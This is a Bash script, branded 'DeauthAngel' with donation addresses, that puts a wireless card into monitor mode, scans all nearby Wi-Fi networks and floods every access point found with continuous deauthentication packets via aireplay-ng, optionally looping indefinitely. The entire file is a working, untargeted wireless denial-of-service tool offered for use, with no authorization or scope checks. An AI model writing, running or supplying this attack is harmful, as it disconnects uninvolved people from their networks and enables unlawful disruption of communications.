#!/bin/bash

# ASCII Art and Header
cat << 'EOF'
========================================================
  _____                   _   _                               _  
 |  __ \                 | | | |       /\                    | | 
 | |  | | ___  __ _ _   _| |_| |__    /  \   _ __   __ _  ___| | 
 | |  | |/ _ \/ _` | | | | __| '_ \  / /\ \ | '_ \ / _` |/ _ \ | 
 | |__| |  __/ (_| | |_| | |_| | | |/ ____ \| | | | (_| |  __/ | 
 |_____/ \___|\__,_|\__,_|\__ |_| |_|    |_| |_|___ |_|  
                                                    __/ |        
                                                   |___/          
========================================================
Created by: Corvus Codex
Github: https://github.com/CorvusCodex/
Licence: MIT License
Support my work:
BTC: bc1q7wth254atug2p4v9j3krk9kauc0ehys2u8tgg3
ETH & BNB: 0x68B6D33Ad1A3e0aFaDA60d6ADf8594601BE492F0
Buy me a coffee: https://www.buymeacoffee.com/CorvusCodex
========================================================
EOF

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install a package
install_package() {
    local pkg=$1
    if ! command_exists "$pkg"; then
        echo "$pkg could not be found, would you like to install it now? (yes/no)"
        read -r answer
        if [[ "$answer" =~ ^[Yy](es)?$ ]]; then
            echo "Installing $pkg..."
            if ! apt-get install "$pkg" -y; then
                echo "Error: Failed to install $pkg"
                exit 1
            fi
        else
            echo "Error: $pkg is required to run this script"
            exit 1
        fi
    fi
}

# Check if script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "Error: Please run as root"
    exit 1
fi

# Check if wireless interface is specified
if [[ -z $1 ]]; then
    echo "Error: Please specify a wireless interface"
    echo "Usage: $0 <interface> [loop]"
    exit 1
fi

INTERFACE=$1
LOOP=false
[[ "$2" == "loop" ]] && LOOP=true

# Check and install required tools
for tool in airmon-ng airodump-ng aireplay-ng; do
    install_package "$tool"
done

# Start monitor mode
echo "Starting monitor mode on $INTERFACE..."
if ! airmon-ng start "$INTERFACE" >/dev/null 2>&1; then
    echo "Error: Failed to start monitor mode on $INTERFACE"
    exit 1
fi

# Main loop
while true; do
    echo "Scanning networks..."
    # Scan networks and save output
    if ! airodump-ng "${INTERFACE}mon" -w networks --output-format csv >/dev/null 2>&1; then
        echo "Error: Network scanning failed"
        airmon-ng stop "${INTERFACE}mon" >/dev/null 2>&1
        exit 1
    fi

    # Parse BSSIDs from CSV
    bssids=$(awk -F',' '/Station MAC/ {exit} NR>2 {print $1}' networks-01.csv | grep -v "^$")

    if [[ -z $bssids ]]; then
        echo "No networks found"
    else
        echo "Found networks, sending deauthentication packets..."
        for bssid in $bssids; do
            echo "Deauthenticating $bssid..."
            aireplay-ng --deauth 0 -a "$bssid" "${INTERFACE}mon" >/dev/null 2>&1 &
        done
        wait # Wait for all background processes to complete
    fi

    # Clean up temporary files
    rm -f networks-01.csv

    # Exit if not in loop mode
    $LOOP || break

    sleep 5 # Add delay between scans
done

# Cleanup
airmon-ng stop "${INTERFACE}mon" >/dev/null 2>&1

# Footer
cat << 'EOF'
========================================================
Script executed successfully
Buy me a coffee: https://www.buymeacoffee.com/CorvusCodex
========================================================
EOF
